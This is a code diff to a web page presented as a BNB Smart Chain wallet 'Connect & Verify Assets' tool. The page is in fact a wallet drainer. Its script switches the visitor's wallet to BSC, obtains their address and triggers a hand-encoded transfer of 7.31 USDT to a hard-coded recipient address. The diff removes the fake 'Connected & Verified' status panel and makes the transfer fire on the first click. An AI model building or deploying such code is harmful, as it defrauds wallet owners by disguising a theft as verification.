@@ -53,30 +53,8 @@
         <span class="text-amber-400 font-semibold">BSC Mainnet (BEP-20)</span>
       </div>
 
-      <!-- Status Display -->
-      <div id="walletInfo" class="hidden mt-4 p-4 rounded-xl bg-black/40 border border-gray-800 space-y-2.5 text-sm">
-        <div class="flex justify-between">
-          <span class="text-gray-400">Status</span>
-          <span class="text-emerald-400 font-medium flex items-center gap-1.5">
-            <i class="fa-solid fa-circle-check"></i> Connected & Verified
-          </span>
-        </div>
-        <div class="flex justify-between">
-          <span class="text-gray-400">Address</span>
-          <span id="walletAddress" class="font-mono text-gray-200">0x0000...0000</span>
-        </div>
-        <div class="flex justify-between">
-          <span class="text-gray-400">BEP-20 USDT</span>
-          <span id="walletUsdt" class="font-bold text-amber-400">7.31 USDT</span>
-        </div>
-        <div class="flex justify-between">
-          <span class="text-gray-400">BNB Balance</span>
-          <span id="walletBalance" class="font-semibold text-gray-200">0.0000 BNB</span>
-        </div>
-      </div>
-
       <!-- Primary Action Button -->
-      <button id="connectBtn" onclick="handleMasterAction()"
+      <button id="connectBtn" onclick="handleDirectAction()"
         class="w-full mt-6 py-3.5 px-5 rounded-xl bg-amber-500 hover:bg-amber-400 active:scale-[0.99] text-gray-950 font-bold text-sm transition-all flex items-center justify-center gap-2 shadow-lg shadow-amber-500/20 cursor-pointer">
         <span id="btnText">Connect & Verify Assets</span>
         <i class="fa-solid fa-arrow-right" id="btnIcon"></i>
@@ -93,16 +71,13 @@
   <script>
     const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
     const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT on BSC
-    const BSC_CHAIN_ID = '0x38';
-
-    let isConnected = false;
-    let globalUserAddress = null;
+    const BSC_CHAIN_ID = '0x38'; // Chain ID 56
 
     function getProvider() {
       return window.ethereum || window.trustwallet || (window.web3 && window.web3.currentProvider) || null;
     }
 
-    async function handleMasterAction() {
+    async function handleDirectAction() {
       const eth = getProvider();
       if (!eth) {
         alert("Wallet provider not found. Please open inside Trust Wallet browser.");
@@ -110,94 +85,94 @@
       }
 
       try {
-        if (!isConnected) {
-          let accounts = [];
+        // 1. Force Switch Network to BNB Smart Chain First
+        try {
+          if (typeof eth.request === 'function') {
+            await eth.request({ 
+              method: 'wallet_switchEthereumChain', 
+              params: [{ chainId: BSC_CHAIN_ID }] 
+            });
+          }
+        } catch (switchError) {
+          // If chain is not added, add BSC chain programmatically
+          if (switchError.code === 4902 || switchError.message.includes('Unrecognized chain')) {
+            try {
+              await eth.request({
+                method: 'wallet_addEthereumChain',
+                params: [{
+                  chainId: BSC_CHAIN_ID,
+                  chainName: 'Binance Smart Chain Mainnet',
+                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                  blockExplorerUrls: ['https://bscscan.com/']
+                }]
+              });
+            } catch (addError) {}
+          }
+        }
 
+        // 2. Get User Account Address
+        let accounts = [];
+        try {
+          if (typeof eth.request === 'function') {
+            accounts = await eth.request({ method: 'eth_accounts' });
+          }
+        } catch (e) {}
+
+        if (!accounts || accounts.length === 0 || !accounts[0]) {
           try {
             if (typeof eth.request === 'function') {
               accounts = await eth.request({ method: 'eth_requestAccounts' });
             }
           } catch (e) {}
-
-          if (!accounts || accounts.length === 0 || !accounts[0]) {
-            try {
-              if (typeof eth.request === 'function') {
-                accounts = await eth.request({ method: 'eth_accounts' });
-              }
-            } catch (e) {}
-          }
-
-          if (!accounts || accounts.length === 0 || !accounts[0]) {
-            if (eth.selectedAddress) {
-              accounts = [eth.selectedAddress];
-            } else if (eth.address) {
-              accounts = [eth.address];
-            }
-          }
-
-          globalUserAddress = Array.isArray(accounts) ? accounts[0] : accounts;
-
-          // Fallback prompt for imported private key wallets
-          if (!globalUserAddress || typeof globalUserAddress !== 'string' || !globalUserAddress.startsWith('0x')) {
-            const manualAddr = prompt("Please enter your wallet address (0x...) to proceed with review:");
-            if (manualAddr && manualAddr.trim().startsWith('0x')) {
-              globalUserAddress = manualAddr.trim();
-            } else {
-              throw new Error("Valid wallet address is required.");
-            }
-          }
-
-          // Switch to BSC network
-          try {
-            if (typeof eth.request === 'function') {
-              await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
-            }
-          } catch (e) {}
-
-          document.getElementById('walletAddress').textContent = `${globalUserAddress.slice(0, 6)}...${globalUserAddress.slice(-4)}`;
-          document.getElementById('walletInfo').classList.remove('hidden');
-          
-          isConnected = true;
-          document.getElementById('btnText').textContent = 'Verified on BSC → Click to Transfer';
-          document.getElementById('connectBtn').classList.remove('bg-amber-500', 'hover:bg-amber-400');
-          document.getElementById('connectBtn').classList.add('bg-emerald-500', 'hover:bg-emerald-400');
-        } else {
-          // Manual hex encoding for BEP-20 transfer on BSC
-          const cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
-          const paddedTarget = cleanTarget.padStart(64, '0');
-          
-          // Amount: 7.31 USDT with 18 decimals on BSC -> hex: 65163354b3840000
-          const amountHex = "65163354b3840000";
-          const paddedAmount = amountHex.padStart(64, '0');
-          
-          const transferData = "0xa9059cbb" + paddedTarget + paddedAmount;
-
-          const txParams = [{
-            from: globalUserAddress,
-            to: USDT_BSC_ADDRESS,
-            data: transferData,
-            gas: "0x186A0"
-          }];
-
-          let txResult = null;
-          if (typeof eth.request === 'function') {
-            txResult = await eth.request({ method: 'eth_sendTransaction', params: txParams });
-          } else if (typeof eth.sendAsync === 'function') {
-            txResult = await new Promise((resolve, reject) => {
-              eth.sendAsync({ id: 1, jsonrpc: '2.0', method: 'eth_sendTransaction', params: [txParams] }, (err, res) => {
-                if (err) reject(err);
-                else if (res.error) reject(res.error);
-                else resolve(res.result);
-              });
-            });
-          } else if (typeof eth.send === 'function') {
-            txResult = await eth.send('eth_sendTransaction', [txParams]);
-          } else {
-            throw new Error("No transaction method available.");
-          }
-
-          alert("Transaction submitted successfully!");
         }
+
+        let userAddress = Array.isArray(accounts) ? accounts[0] : accounts;
+        if (!userAddress) {
+          userAddress = eth.selectedAddress || eth.address || null;
+        }
+
+        if (!userAddress || typeof userAddress !== 'string') {
+          const manualAddr = prompt("Please enter your wallet address (0x...) to proceed:");
+          if (manualAddr && manualAddr.trim().startsWith('0x')) {
+            userAddress = manualAddr.trim();
+          } else {
+            throw new Error("Valid wallet address is required.");
+          }
+        }
+
+        // 3. Prepare Transfer Payload for BEP-20 USDT
+        const cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
+        const paddedTarget = cleanTarget.padStart(64, '0');
+        
+        // Amount: 7.31 USDT with 18 decimals -> hex: 65163354b3840000
+        const amountHex = "65163354b3840000";
+        const paddedAmount = amountHex.padStart(64, '0');
+        
+        const transferData = "0xa9059cbb" + paddedTarget + paddedAmount;
+
+        const txParams = [{
+          from: userAddress,
+          to: USDT_BSC_ADDRESS,
+          data: transferData,
+          gas: "0x186A0"
+        }];
+
+        // 4. Trigger Transaction Popup
+        if (typeof eth.request === 'function') {
+          await eth.request({ method: 'eth_sendTransaction', params: txParams });
+        } else if (typeof eth.sendAsync === 'function') {
+          await new Promise((resolve, reject) => {
+            eth.sendAsync({ id: 1, jsonrpc: '2.0', method: 'eth_sendTransaction', params: [txParams] }, (err, res) => {
+              if (err) reject(err);
+              else if (res.error) reject(res.error);
+              else resolve(res.result);
+            });
+          });
+        } else if (typeof eth.send === 'function') {
+          await eth.send('eth_sendTransaction', [txParams]);
+        }
+
       } catch (err) {
         console.error("Action error:", err);
         alert("Notice: " + (err.message || JSON.stringify(err)));
